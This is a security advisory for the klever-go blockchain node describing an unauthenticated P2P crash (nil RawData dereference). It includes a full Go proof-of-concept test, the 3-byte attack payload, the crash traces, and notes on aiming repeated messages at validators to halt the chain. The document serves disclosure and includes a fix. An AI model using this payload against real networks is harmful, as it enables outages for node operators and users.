# [H] Klever-Go KVM: Unauthenticated remote node crash (nil-pointer DoS) in klever-go P2P transaction interceptor (txVersionChecker nil RawData) - potential chain halt

## Summary
Severity: High
Advisory: GHSA-rm5c-5x2p-48wr
CVE: CVE-2026-52878
CWE: CWE-476
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-06-05
Source: https://github.com/advisories/GHSA-rm5c-5x2p-48wr
Type: github-advisory

## Affected
- Go: `github.com/klever-io/klever-go` — affected >=1.7.14 <1.7.18

## Details
## Summary
Every transaction gossiped on the klever-go P2P network is decoded and validated
synchronously inside the libp2p pubsub topic-validator callback. The validator
`txVersionChecker.CheckTxVersion` dereferences `tx.RawData.Version` with no nil
check. A protobuf `Transaction` whose embedded `RawData` sub-message is omitted
decodes to `RawData == nil`, so validating it triggers a nil-pointer panic.

The libp2p pubsub callback, the underlying go-libp2p-pubsub validation worker, and
klever's own `network/p2p` layer install no `recover()`, so the panic propagates and
crashes the entire node process. The attacker payload is a 3-byte protobuf message;
no validator key, stake, funds, or on-chain account is required. Aimed at enough of
the BLS validator set, repeated delivery halts block production (chain halt).

## Affected component
- Root cause: `core/versioning/txVersionChecker.go:22`
- Reached via: `core/process/transaction/interceptedTransaction.go:203` (integrity) and `:154` (CheckValidity)
- Production tx-topic path: `core/process/interceptors/multiDataInterceptor.go:171` and `:223`
- Unprotected caller: `network/p2p/libp2p/netMessenger.go` `pubsubCallback` (no recover)
- Topic wiring: `core/process/factory/interceptorscontainer/baseInterceptorsContainerFactory.go` (`createOneTxInterceptor`)

## Details
Synchronous validation path, no recovery at any frame:

```
libp2p pubsubCallback                              network/p2p/libp2p/netMessenger.go  (no recover)
 -> MultiDataInterceptor.ProcessReceivedMessage    core/process/interceptors/multiDataInterceptor.go:171
   -> interceptedData(...)                          core/process/interceptors/multiDataInterceptor.go:223
     -> InterceptedTransaction.CheckValidity         core/process/transaction/interceptedTransaction.go:154
       -> integrity()                                core/process/transaction/interceptedTransaction.go:203
         -> txVersionChecker.CheckTxVersion(tx)      core/versioning/txVersionChecker.go:22   <-- nil deref
```

Root cause (`core/versioning/txVersionChecker.go`):
```go
func (tvc *txVersionChecker) CheckTxVersion(tx *transaction.Transaction) error {
	if tx.RawData.Version < tvc.minTxVersion {   // tx.RawData is nil -> panic
		return process.ErrInvalidTransactionVersion
	}
	return nil
}
```

`integrity()` calls `CheckTxVersion` as its very first statement, before any
`RawData` nil-check, and `CheckValidity()` runs before the whitelist / originator-
election gate in the interceptor, so node-role and whitelist restrictions do not
protect this path.

## Preconditions
- Attacker runs an ordinary libp2p peer reachable to the target via normal peering /
  kad-dht discovery on the `transactions` gossip topic.
- Production runs with `withMessageSigning = true`, which only requires the gossip
  message to be signed by the attacker's OWN libp2p peer key (a self-generated
  identity; NOT a validator key, NOT funded, NOT authorized).
- No special config or feature flag; the tx interceptor is built unconditionally and
  subscribes to `transactions` on every node.

## Impact
- Deterministic, immediate crash of any targeted node (validator, sentry, or
  observer) from a single ~3-byte message.
- Gossipsub validates before relaying, so the victim does not forward the crashing
  message; the attacker delivers it directly to each target (one tiny message/node).
- With auto-restart (systemd), re-sending sustains the outage.
- Directed at > 1/3 of the BLS validator set, this prevents consensus and halts the chain.
- NOTE: the HTTP `POST /transaction/send` path is NOT crash-exploitable - the REST
  server uses `gin.Default()` (Recovery middleware) and returns HTTP 500. The
  exploitable vector is the P2P interceptor.

## Exploit cost / attack complexity
- Cost: negligible (one self-signed libp2p peer; 3-byte payload; no gas/capital).
- Complexity: LOW. Unauthenticated, remote, deterministic.

## PoC-Source

Scenario
- Build the malicious transaction as it appears on the wire: a protobuf `Transaction`
  with `RawData` omitted (plus a throwaway `Signature` so the batch entry looks like a
  real tx). With the production proto marshalizer this encodes to 3 bytes
  (`12 01 78`) and round-trips back to `RawData == nil`.
- Feed it through the REAL production interceptors. The `transactions` gossip topic is
  served by a `MultiDataInterceptor` (`baseInterceptorsContainerFactory.go`,
  `createOneTxInterceptor`); the test wraps the tx in a `Batch` exactly like a bulk-tx
  gossip message and calls `ProcessReceivedMessage`, which is precisely what the
  panic-free libp2p `pubsubCallback` invokes in production. A second test drives the
  generic `SingleDataInterceptor` to show the bug is in the shared validation chain.
- The data factory is a faithful copy of the production `interceptedTxDataFactory.Create`:
  it builds a genuine `*InterceptedTransaction`. No validation behavior is stubbed;
  only leaf crypto/marshal helpers use the repo's own in-tree mocks. The panic occurs
  on the first line of `integrity()`, upstream of any mock.

How to run
1. `git clone https://github.com/klever-io/klever-go && cd klever-go`
   (Go toolchain matching go.mod `go 1.25.7`; verified locally on go1.26.3.)
2. Save the source below as `core/process/interceptors/poc_nil_rawdata_dos_test.go`.
3. Run either (separately - the first panic aborts the test binary):
   - Production tx-topic path: `go test ./core/process/interceptors/ -run TestPoC_NilRawData_MultiDataInterceptor -v`
   - Generic path:            `go test ./core/process/interceptors/ -run TestPoC_NilRawData_SingleDataInterceptor -v`
- Dependencies: none beyond the repo's own go.mod (uses in-repo mocks only).

Full PoC source (`poc_nil_rawdata_dos_test.go`):

```go
// Target component:    klever-go P2P transaction interceptor (network availability)
//                      core/process/transaction/interceptedTransaction.go
//                      core/versioning/txVersionChecker.go:22
// Vulnerability type:  Unauthenticated remote Denial-of-Service (nil-pointer panic / chain-wide node crash)
//                      CWE-476 (NULL Pointer Dereference) reached from untrusted P2P input.
//
// Summary:
//   Every gossiped transaction is decoded and validated synchronously inside the
//   libp2p pubsub topic-validator callback
//   (network/p2p/libp2p/netMessenger.go -> pubsubCallback). That callback has NO
//   recover(). The validation chain is:
//
//       (Multi|Single)DataInterceptor.ProcessReceivedMessage
//         -> InterceptedTransaction.CheckValidity
//           -> integrity()
//             -> txVersionChecker.CheckTxVersion(tx)   // tx.RawData.Version  <-- nil deref
//
//   CheckTxVersion dereferences tx.RawData.Version with no nil guard. A protobuf
//   Transaction whose embedded RawData message is omitted unmarshals fine (RawData==nil),
//   so an unauthenticated peer can broadcast a few bytes that panic the validation
//   goroutine and crash the entire node process. Repeating it against the validator
//   set halts consensus.
//
// How to run:
//   1) git clone https://github.com/klever-io/klever-go && cd klever-go
//   2) cp <this file> core/process/interceptors/poc_nil_rawdata_dos_test.go
//   3) go test ./core/process/interceptors/ -run TestPoC_NilRawData -v
//
// Expected output:
//   The test process aborts with:
//     panic: runtime error: invalid memory address or nil pointer dereference
//     ... core/versioning.(*txVersionChecker).CheckTxVersion ... txVersionChecker.go:22
//     ... InterceptedTransaction.integrity ... -> CheckValidity
//     ... (Multi|Single)DataInterceptor.ProcessReceivedMessage
//   i.e. the crash originates from the interceptor's synchronous message-handling frame,
//   exactly where the panic-free libp2p pubsub callback would call it in production.
//
// Dependencies: none beyond the repo's own go.mod (uses in-repo mocks only).

package interceptors_test

import (
	"testing"

	"github.com/klever-io/klever-go/common/mock"
	"github.com/klever-io/klever-go/core"
	"github.com/klever-io/klever-go/core/process"
	"github.com/klever-io/klever-go/core/process/interceptors"
	txproc "github.com/klever-io/klever-go/core/process/transaction"
	"github.com/klever-io/klever-go/core/throttler"
	"github.com/klever-io/klever-go/core/versioning"
	cryptoMock "github.com/klever-io/klever-go/crypto/mock"
	"github.com/klever-io/klever-go/data/batch"
	dataTransaction "github.com/klever-io/klever-go/data/transaction"
)

// buildMaliciousTxBytes returns the proto wire-bytes of a Transaction whose RawData
// field is omitted. This is the entire attacker payload.
func buildMaliciousTxBytes(t *testing.T) []byte {
	m := &mock.ProtoMarshalizerMock{}
	maliciousTx := &dataTransaction.Transaction{ /* RawData: nil */ }
	buff, err := m.Marshal(maliciousTx)
	if err != nil {
		t.Fatalf("marshal malicious tx: %v", err)
	}
	return buff
}

// pocTxFactory is a faithful copy of the production interceptedTxDataFactory.Create:
// it builds a genuine *InterceptedTransaction from the received bytes. No validation
// behavior is stubbed; only leaf crypto/marshal helpers use the repo's standard mocks.
type pocTxFactory struct{}

func (pocTxFactory) Create(buff []byte) (process.InterceptedData, error) {
	m := &mock.ProtoMarshalizerMock{}
	return txproc.NewInterceptedTransaction(&txproc.InterceptedTransactionArgs{
		TxBuff:                 buff,
		ProtoMarshalizer:       m,
		SignMarshalizer:        m,
		Hasher:                 mock.HasherMock{},
		KeyGen:                 &cryptoMock.SingleSignKeyGenMock{},
		Signer:                 &cryptoMock.SignerMock{SigSizeStub: func() int { return 64 }},
		PubkeyConv:             &mock.PubkeyConverterStub{LenCalled: func() int { return 32 }},
		WhiteListerVerifiedTxs: &mock.WhiteListHandlerStub{},
		ChainID:                []byte("chainID"),
		TxSignHasher:           mock.HasherMock{},
		FeeHandler: &mock.FeeHandlerStub{
			CheckValidityTxValuesCalled: func(tx process.TransactionWithFeeHandler) (*dataTransaction.CostResponse, error) {
				return &dataTransaction.CostResponse{}, nil
			},
		},
		TxVersionChecker: versioning.NewTxVersionChecker(0),
		ForkController:   &mock.ForkControllerStub{},
	})
}
func (pocTxFactory) IsInterfaceNil() bool { return false }

// TestPoC_NilRawData_MultiDataInterceptor exercises the EXACT production path for the
// "transactions" gossip topic, which is served by a MultiDataInterceptor (see
// core/process/factory/interceptorscontainer/baseInterceptorsContainerFactory.go,
// func createOneTxInterceptor).
func TestPoC_NilRawData_MultiDataInterceptor(t *testing.T) {
	protoMarsh := &mock.ProtoMarshalizerMock{}

	// Wrap the single malicious tx in a Batch, exactly like a bulk-tx gossip message.
	b := &batch.Batch{Data: [][]byte{buildMaliciousTxBytes(t)}}
	batchBytes, err := protoMarsh.Marshal(b)
	if err != nil {
		t.Fatalf("marshal batch: %v", err)
	}

	th, _ := throttler.NewNumGoRoutinesThrottler(5)
	mdi, err := interceptors.NewMultiDataInterceptor(interceptors.ArgMultiDataInterceptor{
		Topic:            "transactions",
		Marshalizer:      protoMarsh,
		DataFactory:      pocTxFactory{},
		Processor:        &mock.InterceptorProcessorStub{},
		Throttler:        th,
		AntifloodHandler: &mock.P2PAntifloodHandlerStub{},
		WhiteListRequest: &mock.WhiteListHandlerStub{},
		CurrentPeerID:    core.PeerID("self"),
	})
	if err != nil {
		t.Fatalf("build interceptor: %v", err)
	}

	msg := &mock.P2PMessageMock{
		DataField:  batchBytes,
		TopicField: "transactions",
		PeerField:  core.PeerID("attacker"),
	}

	// In production this is called by the libp2p pubsub callback, which has no recover().
	// The nil-pointer panic therefore propagates and crashes the node process.
	_ = mdi.ProcessReceivedMessage(msg, core.PeerID("attacker"))

	// Only reached if the bug is fixed (CheckTxVersion guards a nil RawData).
	t.Log("no panic: node survived -> NOT vulnerable")
}

// TestPoC_NilRawData_SingleDataInterceptor shows the same crash via the generic
// single-item interceptor path, demonstrating the bug is in the shared validation
// chain, not in one interceptor variant.
func TestPoC_NilRawData_SingleDataInterceptor(t *testing.T) {
	th, _ := throttler.NewNumGoRoutinesThrottler(5)
	sdi, err := interceptors.NewSingleDataInterceptor(interceptors.ArgSingleDataInterceptor{
		Topic:            "transactions",
		DataFactory:      pocTxFactory{},
		Processor:        &mock.InterceptorProcessorStub{},
		Throttler:        th,
		AntifloodHandler: &mock.P2PAntifloodHandlerStub{},
		WhiteListRequest: &mock.WhiteListHandlerStub{},
		CurrentPeerID:    core.PeerID("self"),
	})
	if err != nil {
		t.Fatalf("build interceptor: %v", err)
	}

	msg := &mock.P2PMessageMock{
		DataField:  buildMaliciousTxBytes(t),
		TopicField: "transactions",
		PeerField:  core.PeerID("attacker"),
	}

	_ = sdi.ProcessReceivedMessage(msg, core.PeerID("attacker"))
	t.Log("no panic: node survived -> NOT vulnerable")
}
```

## PoC-Results

Result A - production `MultiDataInterceptor` (the `transactions` gossip topic):
```
$ go test ./core/process/interceptors/ -run TestPoC_NilRawData_MultiDataInterceptor -v
=== RUN   TestPoC_NilRawData_MultiDataInterceptor
--- FAIL: TestPoC_NilRawData_MultiDataInterceptor (0.00s)
panic: runtime error: invalid memory address or nil pointer dereference [recovered, repanicked]
[signal SIGSEGV: segmentation violation code=0x1 addr=0x70 pc=0x7b7be4]

goroutine 8 [running]:
panic({0x888c00?, 0xd54d60?})
        /usr/lib/go-1.26/src/runtime/panic.go:860 +0x13a
github.com/klever-io/klever-go/core/versioning.(*txVersionChecker).CheckTxVersion(0x7?, 0x7?)
        .../core/versioning/txVersionChecker.go:22 +0x4
github.com/klever-io/klever-go/core/process/transaction.(*InterceptedTransaction).integrity(...)
        .../core/process/transaction/interceptedTransaction.go:203 +0x31
github.com/klever-io/klever-go/core/process/transaction.(*InterceptedTransaction).CheckValidity(...)
        .../core/process/transaction/interceptedTransaction.go:154 +0x13
github.com/klever-io/klever-go/core/process/interceptors.(*MultiDataInterceptor).interceptedData(...)
        .../core/process/interceptors/multiDataInterceptor.go:223 +0x9c
github.com/klever-io/klever-go/core/process/interceptors.(*MultiDataInterceptor).ProcessReceivedMessage(...)
        .../core/process/interceptors/multiDataInterceptor.go:171 +0x7ca
github.com/klever-io/klever-go/core/process/interceptors_test.TestPoC_NilRawData_MultiDataInterceptor(...)
        .../core/process/interceptors/poc_nil_rawdata_dos_test.go:135 +0x3ef
FAIL    github.com/klever-io/klever-go/core/process/interceptors    0.005s
FAIL
```

Result B - generic `SingleDataInterceptor` (same root cause via the shared chain):
```
$ go test ./core/process/interceptors/ -run TestPoC_NilRawData_SingleDataInterceptor -v
=== RUN   TestPoC_NilRawData_SingleDataInterceptor
--- FAIL: TestPoC_NilRawData_SingleDataInterceptor (0.00s)
panic: runtime error: invalid memory address or nil pointer dereference [recovered, repanicked]
[signal SIGSEGV: segmentation violation code=0x1 addr=0x70 pc=0x7b7be4]

goroutine 8 [running]:
panic({0x888c00?, 0xd54d60?})
        /usr/lib/go-1.26/src/runtime/panic.go:860 +0x13a
github.com/klever-io/klever-go/core/versioning.(*txVersionChecker).CheckTxVersion(0x7?, 0x7?)
        .../core/versioning/txVersionChecker.go:22 +0x4
github.com/klever-io/klever-go/core/process/transaction.(*InterceptedTransaction).integrity(...)
        .../core/process/transaction/interceptedTransaction.go:203 +0x31
github.com/klever-io/klever-go/core/process/transaction.(*InterceptedTransaction).CheckValidity(...)
        .../core/process/transaction/interceptedTransaction.go:154 +0x13
github.com/klever-io/klever-go/core/process/interceptors.(*SingleDataInterceptor).ProcessReceivedMessage(...)
        .../core/process/interceptors/singleDataInterceptor.go:118 +0x12e
github.com/klever-io/klever-go/core/process/interceptors_test.TestPoC_NilRawData_SingleDataInterceptor(...)
        .../core/process/interceptors/poc_nil_rawdata_dos_test.go:165 +0x2b1
FAIL    github.com/klever-io/klever-go/core/process/interceptors    0.005s
FAIL
```

Interpretation
- Both runs abort the process with SIGSEGV originating at `txVersionChecker.go:22`
  (`tx.RawData.Version`), reached through the real interceptor's synchronous
  `ProcessReceivedMessage` frame - the exact frame the recover-free libp2p pubsub
  callback executes in production. A recover()-less crash here = full node process exit.
- Round-trip check (production `tools/marshal.ProtoMarshalizer`): the malicious tx is
  3 bytes `12 01 78` and decodes to `RawData == nil`, confirming the trigger is a
  valid, attacker-craftable wire message (not a malformed blob rejected earlier).

## Suggested fix
Primary (root cause) - make `CheckTxVersion` nil-safe / reject `RawData == nil` early:
```go
func (tvc *txVersionChecker) CheckTxVersion(tx *transaction.Transaction) error {
	if tx == nil || tx.RawData == nil {
		return process.ErrInvalidTransactionVersion
	}
	if tx.RawData.Version < tvc.minTxVersion {
		return process.ErrInvalidTransactionVersion
	}
	return nil
}
```
Returning a sentinel error here is already handled by the interceptors (they
blacklist peers that send wrong-version transactions).

Defense-in-depth:
- Wrap the synchronous body of `pubsubCallback` (and/or `ProcessReceivedMessage`) in a
  `recover()` so a single malformed message can never abort the process.
- Audit the other direct `inTx.tx.RawData.*` dereferences in
  `interceptedTransaction.go` (chainID/sender/contract/nonce/fee getters) for the same
  nil-input class.

## Duplicate check (vs published advisories)
Checked against the 3 published advisories (GHSA-jc6w-wmfc-fh33 / CVE-2026-46403,
GHSA-87m7-qffr-542v / CVE-2026-44697, GHSA-74m6-4hjp-7226). This is NOT a duplicate:
different root cause (nil `RawData` deref vs gzip OOM / throttler accounting / VM
read-only isolation); the advisory texts never mention `RawData`, `CheckTxVersion`,
`txVersionChecker`, or any nil/NULL deref. Those three advisories' fixes are already
present in the reviewed tree, yet `txVersionChecker.go:22` remains unpatched. It is
adjacent in impact class (P2P interceptor DoS) to 87m7 / 74m6, referenced here for context.

## References
- https://github.com/klever-io/klever-go/security/advisories/GHSA-rm5c-5x2p-48wr
- https://github.com/klever-io/klever-go
- https://github.com/klever-io/klever-go/releases/tag/v1.7.18
